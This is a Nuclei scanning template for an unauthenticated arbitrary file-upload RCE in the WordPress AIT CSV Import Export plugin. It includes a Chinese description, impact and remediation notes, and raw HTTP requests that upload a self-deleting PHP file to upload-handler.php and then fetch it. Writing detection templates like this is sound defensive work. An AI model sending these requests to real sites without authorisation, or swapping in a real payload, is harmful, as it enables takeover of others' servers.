id: ait-csv-import-export-rce

info:
  name: WordPress AIT CSV Import Export - 未授权 - 远程代码执行漏洞
  author: gy741
  severity: critical
  description: |
    该模板用于检测 WordPress AIT CSV Import Export - 未授权 - 远程代码执行漏洞。该类漏洞通常源于上传接口缺少认证、文件类型校验、存储隔离或执行权限控制。模板会向 `/wp-content/plugins/ait-csv-import-export/admin/upload-handler.php`、`/wp-content/uploads/{{randstr}}.php` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可能上传脚本、WebShell 或恶意文件，并借此执行代码或长期控制服务器。
    - 上传目录若可被访问或解析，可能导致数据篡改、恶意内容投递和业务系统被接管。
  remediation: |
    - 为上传接口增加认证授权和 CSRF 防护，限制可上传文件类型、大小和扩展名。
    - 在服务端校验文件内容与 MIME 类型，将上传文件存储到不可执行目录并使用随机文件名。
    - 清理异常上传文件，复核上传目录解析配置、访问日志和可疑账号活动。
  reference:
    - https://wpscan.com/vulnerability/10471
    - https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/wp_ait_csv_rce.rb
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 9.8
    cwe-id: CWE-434
  metadata:
    max-request: 2
  tags: wp-plugin,rce,fileupload,unauth,wpscan,msf,wordpress,ait-csv,intrusive,vuln

variables:
  string: "ait-csv-import-export-rce"

http:
  - raw:
      - |
        POST /wp-content/plugins/ait-csv-import-export/admin/upload-handler.php HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Content-Type: multipart/form-data; boundary=------------------------ab360007dbae2de8

        --------------------------ab360007dbae2de8
        Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"
        Content-Type: application/octet-stream

        sep=;<?php echo md5("{{string}}");unlink(__FILE__);?>

        --------------------------ab360007dbae2de8--
      - |
        GET /wp-content/uploads/{{randstr}}.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - '{{md5(string)}}'
